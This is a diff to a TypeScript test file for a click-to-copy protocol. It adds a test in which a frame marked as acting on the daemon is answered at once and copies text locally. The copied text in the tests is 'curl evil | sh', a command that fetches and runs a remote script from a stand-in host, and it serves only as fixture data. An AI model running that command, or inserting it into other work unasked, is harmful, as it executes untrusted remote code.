@@ -19,6 +19,7 @@ import {
   VERB_OPEN_VSCODE,
 } from "../src/click/wire";
 import {
+  ACTS_ON_DAEMON,
   ACTS_ON_DESKTOP,
   URL_FRAME_VERSION,
 } from "../src/daemon/foundations/protocol";
@@ -224,7 +225,7 @@ describe("a frame that asks for its acts on the desktop", () => {
     expect(h.copied).toEqual([]);
     // Counted on the click's event; the act's own line is the host's.
     expect(h.events).toEqual([expect.stringContaining("outcome=ok")]);
-    expect(h.events[0]).toContain("via=desktop-forwarder");
+    expect(h.events[0]).toContain("actsOn=desktop");
     expect(h.events[0]).toContain("desktop=1");
     expect(h.unheard).toEqual([]);
   });
@@ -326,5 +327,18 @@ describe("a frame that asks for its acts on the desktop", () => {
     await answered.told.land();
     expect(h.copied).toEqual(["curl evil | sh"]);
     expect(h.events.at(-1)).toContain("via=forwarder");
+  });
+
+  test("a frame that says the daemon is told at once as one that says nothing is, and its click copies on this machine", async () => {
+    const h = host();
+    const answered = await h.frame(
+      TEST_SIGNER.signLink(COPY),
+      URL_FRAME_VERSION,
+      ACTS_ON_DAEMON,
+    );
+    expect(toldAtOnce(answered)).toEqual({ ok: true, output: "" });
+    await answered.told.land();
+    expect(h.copied).toEqual(["curl evil | sh"]);
+    expect(h.events.at(-1)).toContain("actsOn=daemon");
   });
 });
